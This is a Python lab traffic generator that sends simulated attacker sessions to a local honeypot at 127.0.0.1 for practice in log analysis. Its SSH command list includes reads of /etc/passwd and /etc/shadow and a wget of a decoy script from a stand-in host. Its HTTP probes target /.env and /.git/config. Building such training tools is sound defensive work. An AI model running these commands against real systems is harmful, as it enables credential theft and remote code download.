"""Lab traffic generator.

Connects only to 127.0.0.1. It fills the local honeypot log so you can practice
analysis. It is not a scanner and it has no host argument.
"""

from __future__ import annotations

import argparse
import io
import socket
import time
import urllib.error
import urllib.parse
import urllib.request

from honeypot.config import ConfigError, load_settings
from honeypot.events import configure_stdio

LAB_HOST = "127.0.0.1"
TRAINING_PASSWORD = "training-only"
SHELL_COMMANDS = (
    "pwd",
    "uname -a",
    "ls -la",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "cat /home/admin/notes.txt",
    "wget http://example.invalid/lab-decoy.sh",
    "exit",
)


def _check_lab_host(host: str) -> str:
    if host != "127.0.0.1":
        raise RuntimeError("The lab client only connects to 127.0.0.1.")
    return host


def wait_for_port(port: int, timeout: float = 15) -> bool:
    host = _check_lab_host(LAB_HOST)
    deadline = time.time() + timeout
    while time.time() < deadline:
        with socket.socket() as sock:
            sock.settimeout(0.3)
            try:
                if sock.connect_ex((host, port)) == 0:
                    return True
            except OSError:
                pass
        time.sleep(0.2)
    return False


def exercise_http(port: int) -> None:
    host = _check_lab_host(LAB_HOST)
    base = f"http://{host}:{port}"
    with urllib.request.urlopen(base + "/", timeout=5) as response:
        response.read()
    for username in ("admin", "guest"):
        data = urllib.parse.urlencode({"username": username, "password": TRAINING_PASSWORD}).encode()
        request = urllib.request.Request(base + "/login", data=data, method="POST")
        try:
            with urllib.request.urlopen(request, timeout=5) as response:
                response.read()
        except urllib.error.HTTPError as exc:
            exc.read()
    for path in ("/overview", "/.env", "/.git/config", "/wp-login.php", "/backup", "/no-such-page"):
        try:
            with urllib.request.urlopen(base + path, timeout=5) as response:
                response.read()
        except urllib.error.HTTPError as exc:
            exc.read()
    body = urllib.parse.urlencode({"note": "UNIQUE_BODY_MARKER_4433"}).encode()
    request = urllib.request.Request(
        base + "/comment",
        data=body,
        method="POST",
        headers={"Content-Type": "text/plain"},
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            response.read()
    except urllib.error.HTTPError as exc:
        exc.read()
    print(f"HTTP training session sent to {base}")


def exercise_ftp(port: int) -> None:
    import ftplib

    host = _check_lab_host(LAB_HOST)
    ftp = ftplib.FTP()
    ftp.connect(host, port, timeout=8)
    ftp.login("backup", TRAINING_PASSWORD)
    ftp.retrlines("LIST")
    ftp.retrbinary("RETR README.txt", io.BytesIO().write)
    ftp.storbinary("STOR drop.bin", io.BytesIO(b"training-upload\n"))
    ftp.quit()
    print(f"FTP training session sent to {host}:{port}")


def _prompted(data: bytes) -> bool:
    return data.endswith(b"$ ") or data.endswith(b"# ")


def _read_until_prompt(channel, timeout: float) -> str:
    channel.settimeout(0.3)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = channel.recv(4096)
        except socket.timeout:
            if _prompted(data):
                break
            continue
        except Exception:
            break
        if not chunk:
            break
        data += chunk
        if _prompted(data):
            break
    return data.decode("utf-8", "replace")


def exercise_ssh(port: int) -> None:
    import paramiko

    host = _check_lab_host(LAB_HOST)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host,
            port=port,
            username="root",
            password=TRAINING_PASSWORD,
            timeout=10,
            banner_timeout=10,
            auth_timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )
        channel = client.invoke_shell(width=100, height=30)
        transcript = [_read_until_prompt(channel, 8)]
        for command in SHELL_COMMANDS:
            channel.send(command + "\n")
            transcript.append(_read_until_prompt(channel, 8))
        text = "\n".join(transcript)
        print(text)
        if "training shell" not in text.lower() and "not executed" not in text.lower():
            raise RuntimeError("SSH decoy did not return the training banner.")
    finally:
        client.close()
    print(f"SSH training session sent to {host}:{port}")


def main(argv: list[str] | None = None) -> int:
    configure_stdio()
    parser = argparse.ArgumentParser(description="Send a local training session to the honeypot on 127.0.0.1")
    parser.add_argument("--config", help="Path to honeypot.json")
    args = parser.parse_args(argv)
    try:
        settings = load_settings(args.config)
    except ConfigError as exc:
        print(exc)
        return 1
    failures: list[str] = []
    checks = []
    if settings.http.enabled:
        checks.append(("HTTP", settings.http.port, exercise_http))
    if settings.ftp.enabled:
        checks.append(("FTP", settings.ftp.port, exercise_ftp))
    if settings.ssh.enabled:
        checks.append(("SSH", settings.ssh.port, exercise_ssh))
    for name, port, func in checks:
        if not wait_for_port(port):
            failures.append(f"{name} is not listening on 127.0.0.1:{port}")
            continue
        try:
            func(port)
        except Exception as exc:
            failures.append(f"{name} training session failed: {type(exc).__name__}: {exc}")
    if failures:
        print("Start the honeypot first in another terminal: python -m honeypot")
        for item in failures:
            print(item)
        return 1
    dash = settings.dashboard.port
    print(f"Done. Open http://127.0.0.1:{dash} and run: python -m honeypot.analyze")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
